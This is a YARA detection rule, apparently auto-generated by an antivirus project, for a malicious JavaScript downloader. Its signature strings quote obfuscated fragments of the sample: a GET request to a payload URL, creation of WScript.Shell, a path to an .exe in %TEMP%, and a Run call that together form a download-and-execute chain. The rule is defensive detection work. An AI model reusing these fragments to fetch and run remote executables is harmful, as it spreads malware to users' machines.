rule sig_20160330_b522e4e11257aa1f90f03929ce516303 {
  meta:
    description = "datamaliciousorder - file 20160330_b522e4e11257aa1f90f03929ce516303.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f450fd840ad2a32ecdabb86cdf599b3fbc3e3e1a56882c6de5f1bcecc6191a1a"

  strings:
    $s1  = "_V[_A](\"GET\", \"http://pro.monbento.com/n3iska\", false);" fullword ascii
    $s2  = "var _C = function _LR() {return WScript[_H0](\"WScript\"+\".Shell\");}(), _HX = 11;" fullword ascii
    $s3  = "function _KM(_Q, _CF){_EI = _EI * 1; return _Q - _CF;};" fullword ascii
    $s4  = "if (_V[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _WV(){return _PC + \"\";};" fullword ascii
    $s6  = "function _PM() {return _C[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"afXr14xn.ex\" + \"e\";};" fullword ascii
    $s7  = "function _RD(_U1){_C[\"Run\"](_U1, _EI, _EI);};" fullword ascii
    $s8  = "function _PF() {return ((_BX == true) && (_BX == _EE)) ? 1 : _EI;};" fullword ascii
    $s9  = "function _IV(){return 22;};" fullword ascii
    $s10 = "function _MC()" fullword ascii
    $s11 = " while (_TC){" fullword ascii
    $s12 = "function _H(_GU) {var _YG = (1, 2, 3, 4, 5, _GU); return _YG;};" fullword ascii
    $s13 = "var _IZ = new this[\"Date\"]();" fullword ascii
    $s14 = "return _KM(_YT, _Y);" fullword ascii
    $s15 = "function _TG(){return _H0;};" fullword ascii
    $s16 = "var _LY = false;" fullword ascii
    $s17 = "var _EE = false;" fullword ascii
    $s18 = "_BX = true; " fullword ascii
    $s19 = "var _BX = false;" fullword ascii
    $s20 = "_EE = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}